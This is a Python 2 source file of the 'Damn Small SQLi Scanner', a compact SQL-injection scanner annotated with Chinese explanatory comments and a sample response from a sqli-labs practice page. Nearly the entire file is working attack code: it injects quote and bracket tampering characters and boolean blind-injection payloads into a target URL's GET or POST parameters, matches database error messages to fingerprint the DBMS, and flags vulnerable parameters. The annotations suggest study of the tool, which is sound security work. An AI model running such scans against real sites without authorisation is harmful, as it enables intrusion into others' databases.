#!/usr/bin/env python2
# -*- coding:utf-8 -*-
import difflib, httplib, itertools, optparse, random, re, urllib, urllib2, urlparse

NAME, VERSION, AUTHOR, LICENSE = "Damn Small SQLi Scanner (DSSS) < 100 LoC (Lines of Code)", "0.2y", "Miroslav Stampar (@stamparm)", "Public domain (FREE)"

PREFIXES = (" ", ") ", "' ", "') ")  # prefix values used for # 前缀 4种字符
SUFFIXES = ("", "-- -", "#", "%%16")  # suffix values used for # 后缀 4种字符
# building testing blind payloads  盲注
TAMPER_SQL_CHAR_POOL = ('(', ')', '\'', '"')  # characters used for SQL tampering/poisoning of parameter values # ( )
#  左右括号、单双引号  用于引起sql语句的报错
BOOLEAN_TESTS = ("AND %d=%d", "OR NOT (%d>%d)")  # boolean tests used for building testing blind payloads 2种
COOKIE, UA, REFERER = "Cookie", "User-Agent", "Referer"  # optional HTTP header names
GET, POST = "GET", "POST"  # enumerator-like values used for marking current phase
TEXT, HTTPCODE, TITLE, HTML = xrange(4)  # enumerator-like values used for marking content type
FUZZY_THRESHOLD = 0.95  # ratio value in range (0,1) used for distinguishing True from False responses
TIMEOUT = 30  # connection timeout in seconds
RANDINT = random.randint(1, 255)  # random integer value used across all tests
BLOCKED_IP_REGEX = r"(?i)(\A|\b)IP\b.*\b(banned|blocked|bl(a|o)ck\s?list|firewall)"  # regular expression used for
# recognition of generic firewall blocking messages 识别是否有防护

DBMS_ERRORS = {  # regular expressions used for
    # DBMS recognition based on error message response
    "MySQL": (r"SQL syntax.*MySQL", r"Warning.*mysql_.*", r"valid MySQL result", r"MySqlClient\."),
    "PostgreSQL": (r"PostgreSQL.*ERROR", r"Warning.*\Wpg_.*", r"valid PostgreSQL result", r"Npgsql\."),
    "Microsoft SQL Server": (
        r"Driver.* SQL[\-\_\ ]*Server", r"OLE DB.* SQL Server", r"(\W|\A)SQL Server.*Driver", r"Warning.*mssql_.*",
        r"(\W|\A)SQL Server.*[0-9a-fA-F]{8}", r"(?s)Exception.*\WSystem\.Data\.SqlClient\.",
        r"(?s)Exception.*\WRoadhouse\.Cms\."),
    "Microsoft Access": (r"Microsoft Access Driver", r"JET Database Engine", r"Access Database Engine"),
    "Oracle": (
        r"\bORA-[0-9][0-9][0-9][0-9]", r"Oracle error", r"Oracle.*Driver", r"Warning.*\Woci_.*", r"Warning.*\Wora_.*"),
    "IBM DB2": (r"CLI Driver.*DB2", r"DB2 SQL error", r"\bdb2_\w+\("),
    "SQLite": (r"SQLite/JDBCDriver", r"SQLite.Exception", r"System.Data.SQLite.SQLiteException", r"Warning.*sql ite_.*",
               r"Warning.*SQLite3::", r"\[SQLITE_ERROR\]"),
    "Sybase": (r"(?i)Warning.*sybase.*", r"Sybase message", r"Sybase.*Server message.*"),
}


def _retrieve_content(url, data=None):  # 提取页面内容
    retval = {HTTPCODE: httplib.OK}
    try:
        req = urllib2.Request(
            "".join(url[_].replace(' ', "%20") if _ > url.find('?') else url[_] for _ in xrange(len(url))), data,
            globals().get("_headers", {}))
        # for _ in xrange(len(url)):  如果url长度为10,则_的输出为0到10 ,_是url的索引
        # if _ > url.find('?') 当url的索引在?的右边的时候,开始替换,就是要把参数或参数值里的空格替换为url编码后的%20
        retval[HTML] = urllib2.urlopen(req, timeout=TIMEOUT).read()  # 发送请求,获取网页源码
    except Exception, ex:
        retval[HTTPCODE] = getattr(ex, "code", None)  # 获取失败的Response code
        retval[HTML] = ex.read() if hasattr(ex, "read") else getattr(ex, "msg", "")  # 尝试获取请求失败的页面源码,否则获取报错信息
    retval[HTML] = "" if re.search(BLOCKED_IP_REGEX, retval[HTML]) else retval[
        HTML]  # 正则匹配,判断该请求是否触发了防护机制.如果匹配到了防护的内容,网页源码置为空
    # print "替换前"
    # print retval[HTML]
    retval[HTML] = re.sub(r"(?i)[^>]*(AND|OR)[^<]*%d[^<]*" % RANDINT, "__REFLECTED__", retval[HTML])

    # 正则表达式 (?i)[^>]*(AND|OR)[^<]*%d[^<]*
    # print '替换后'
    # print retval[HTML]

    match = re.search(r"<title>(?P<result>[^<]+)</title>", retval[HTML], re.I)  # 查看页面源码中有无title标签
    retval[TITLE] = match.group("result") if match and "result" in match.groupdict() else None
    retval[TEXT] = re.sub(r"(?si)<script.+?</script>|<!--.+?-->|<style.+?</style>|<[^>]+>|\s+", " ", retval[HTML])
    # 正则表达式(?si)<script.+?</script>|<!--.+?-->|<style.+?</style>|<[^>]+>|\s+
    # 将标签开头到标签结尾替换成空格,只留下文本,如 <script>123123</script> 456456,经过替换后,只剩下456456
    return retval


def scan_page(url, data=None):
    retval, usable = False, False  #
    url, data = re.sub(r"=(&|\Z)", "=1\g<1>", url) if url else url, re.sub(r"=(&|\Z)", "=1\g<1>", data) if data else \
        data  # 正则替换
    print '----url处理-----'
    print url
    try:
        for phase in (GET, POST):
            original, current = None, url if phase is GET else (data or "")
            for match in re.finditer(r"((\A|[?&])(?P<parameter>[^_]\w*)=)(?P<value>[^&#]+)", current):  # 找出可测试参数
                vulnerable, usable = False, True
                print "* scanning %s parameter '%s'" % (phase, match.group("parameter"))
                original = original or (
                    _retrieve_content(current, data) if phase is GET else _retrieve_content(url, current))

                ###### 报错注入测试 ######


                print original  # 原始返回包数据块
                tampered = current.replace(match.group(0), "%s%s" % (match.group(0), urllib.quote("".join(
                    random.sample(TAMPER_SQL_CHAR_POOL, len(TAMPER_SQL_CHAR_POOL))))))  # 篡改参数
                # print tampered  # 加载payload后的url   id=1 篡改后可能为id=1"()' 每次都会有这4个字符,只不过位置是随机的
                # print '----------------'


                content = _retrieve_content(tampered, data) if phase is GET else _retrieve_content(url, tampered)  #
                # content是 篡改请求后的返回包数据块
                for (dbms, regex) in ((dbms, regex) for dbms in DBMS_ERRORS for regex in DBMS_ERRORS[dbms]):
                    if not vulnerable and re.search(regex, content[HTML], re.I) and not re.search(regex, original[HTML],
                                                                                                  re.I):  #
                        # 正则匹配是否数据库报错的信息
                        print " (i) %s parameter '%s' appears to be error SQLi vulnerable (%s)" % (
                            phase, match.group("parameter"), dbms)
                        retval = vulnerable = True
                vulnerable = False

                for prefix, boolean, suffix, inline_comment in itertools.product(PREFIXES, BOOLEAN_TESTS, SUFFIXES,
                                                                                 (False, True)):
                    if not vulnerable:
                        template = ("%s%s%s" % (prefix, boolean, suffix)).replace(" " if inline_comment else "/**/",
                                                                                  "/**/")  # 生成payload模板
                        # print "template:--------"
                        # print template
                        # print '-----------------'
                        # 生成payload
                        # 示例: {False: 'http://sqlilabs:8888/Less-1/?id=1%20AND%2016%3D15&a=2', True: 'http://sqlilabs:8888/Less-1/?id=1%20AND%2015%3D15&a=2'}
                        payloads = dict((_, current.replace(match.group(0), "%s%s" % (
                            match.group(0),
                            urllib.quote(template % (RANDINT if _ else RANDINT + 1, RANDINT), safe='%'))))
                                        for _ in (True, False))

                        # print "payloads:--------"
                        # print payloads
                        contents = dict((_, _retrieve_content(payloads[_], data) if phase is GET else _retrieve_content(
                            url, payloads[_])) for _ in (False, True))
                        # print "contents:--------"
                        # print contents
                        # 返回数据中提取出来的判定锚 ,依旧是预设为真、预设为假
                        '''
                        示例:
                        {False: {0: '         Less-1 **Error Based- String**       Welcome&nbsp;&nbsp;&nbsp;  Dhakkan       Your Login name:Dumb Your Password:Dumb                ', 1: 200, 2: 'Less-1 **Error Based- String**', 3: '<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">\r\n<html xmlns="http://www.w3.org/1999/xhtml">\r\n<head>\r\n<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />\r\n<title>Less-1 **Error Based- String**</title>\r\n</head>\r\n\r\n<body bgcolor="#000000">\r\n<div style=" margin-top:70px;color:#FFF; font-size:23px; text-align:center">Welcome&nbsp;&nbsp;&nbsp;<font color="#FF0000"> Dhakkan </font><br>\r\n<font size="3" color="#FFFF00">\r\n\r\n\r\n\n\r\n\r\n\r\n\r\n \r\n<font size=\'5\' color= \'#99FF00\'>Your Login name:Dumb<br>Your Password:Dumb</font></font> </div></br></br></br><center>\r\n<img src="../images/Less-1.jpg" /></center>\r\n</body>\r\n</html>\r\n\r\n\r\n\r\n\r\n\r\n \r\n'}, 
                        True: {0: '         Less-1 **Error Based- String**       Welcome&nbsp;&nbsp;&nbsp;  Dhakkan       Your Login name:Dumb Your Password:Dumb                ', 1: 200, 2: 'Less-1 **Error Based- String**', 3: '<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">\r\n<html xmlns="http://www.w3.org/1999/xhtml">\r\n<head>\r\n<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />\r\n<title>Less-1 **Error Based- String**</title>\r\n</head>\r\n\r\n<body bgcolor="#000000">\r\n<div style=" margin-top:70px;color:#FFF; font-size:23px; text-align:center">Welcome&nbsp;&nbsp;&nbsp;<font color="#FF0000"> Dhakkan </font><br>\r\n<font size="3" color="#FFFF00">\r\n\r\n\r\n\n\r\n\r\n\r\n\r\n \r\n<font size=\'5\' color= \'#99FF00\'>Your Login name:Dumb<br>Your Password:Dumb</font></font> </div></br></br></br><center>\r\n<img src="../images/Less-1.jpg" /></center>\r\n</body>\r\n</html>\r\n\r\n\r\n\r\n\r\n\r\n \r\n'}}
                        '''

                        if all(_[HTTPCODE] and _[HTTPCODE] < httplib.INTERNAL_SERVER_ERROR for _ in
                               (original, contents[True], contents[False])):  # 如果3次请求的Response code都小于500
                            if any(original[_] == contents[True][_] != contents[False][_] for _ in (HTTPCODE,
                                                                                                    TITLE)):
                                # 第一种判断逻辑,用HTTPCODE或TITLE作为依据来判断
                                vulnerable = True
                            else:
                                # 第二种判断逻辑,页面文本的相似度
                                ratios = dict(
                                    (_, difflib.SequenceMatcher(None, original[TEXT], contents[_][TEXT]).quick_ratio())
                                    for _ in (False, True))
                                # print "ratios:--------"
                                # print ratios
                                # ratios示例: {False: 0.6517412935323383, True: 0.6517412935323383} 计算两次的相似度
                                #
                                # ratio()函数 that this is 1.0 if the sequences are identical, and 0.0 if they have nothing in common.
                                # quick_ratio()函数 返回一个大于ratio()函数返回相似度的值，比ratio()相对要快一些.
                                #
                                # ratios是一个字典,里面分别
                                # print ratios.values() # ratios.values()实例: [1.0, 1.0]
                                # FUZZY_THRESHOLD = 0.95  # ratio value in range (0,1) used for distinguishing True from False responses
                                vulnerable = all(ratios.values()) and \
                                             min(ratios.values()) < FUZZY_THRESHOLD < max(ratios.values()) \
                                             and abs(ratios[True] - ratios[False]) > FUZZY_THRESHOLD / 10
                                # abs(ratios[True] - ratios[False]) > FUZZY_THRESHOLD / 10
                                # print vulnerable
                        if vulnerable:
                            print " (i) %s parameter '%s' appears to be blind SQLi vulnerable (e.g.: '%s')" % (
                                phase, match.group("parameter"), payloads[True])  # 盲注测试
                            retval = True
        if not usable:
            print " (x) no usable GET/POST parameters found"
    except KeyboardInterrupt:
        print "\r (x) Ctrl-C pressed"
    return retval


def init_options(proxy=None, cookie=None, ua=None, referer=None):
    # 初始化,
    globals()["_headers"] = dict(filter(lambda _: _[1], ((COOKIE, cookie), (UA, ua or NAME), (REFERER, referer))))  #
    # 可自定义头部,cookie,proxy,referer,user-agent
    urllib2.install_opener(urllib2.build_opener(urllib2.ProxyHandler({'http': proxy})) if proxy else None)  # 设置代理


if __name__ == "__main__":
    print "%s #v%s\n by: %s\n" % (NAME, VERSION, AUTHOR)
    parser = optparse.OptionParser(version=VERSION)
    parser.add_option("-u", "--url", dest="url", help="Target URL (e.g. \"http://www.target.com/page.php?id=1\")")
    parser.add_option("--data", dest="data", help="POST data (e.g. \"query=test\")")
    parser.add_option("--cookie", dest="cookie", help="HTTP Cookie header value")
    parser.add_option("--user-agent", dest="ua", help="HTTP User-Agent header value")
    parser.add_option("--referer", dest="referer", help="HTTP Referer header value")
    parser.add_option("--proxy", dest="proxy", help="HTTP proxy address (e.g. \"http://127.0.0.1:8080\")")
    options, _ = parser.parse_args()
    if options.url:
        init_options(options.proxy, options.cookie, options.ua, options.referer)
        result = scan_page(options.url if options.url.startswith("http") else "http://%s" % options.url, options.data)
        print "\nscan results: %s vulnerabilities found" % ("possible" if result else "no")
    else:
        parser.print_help()
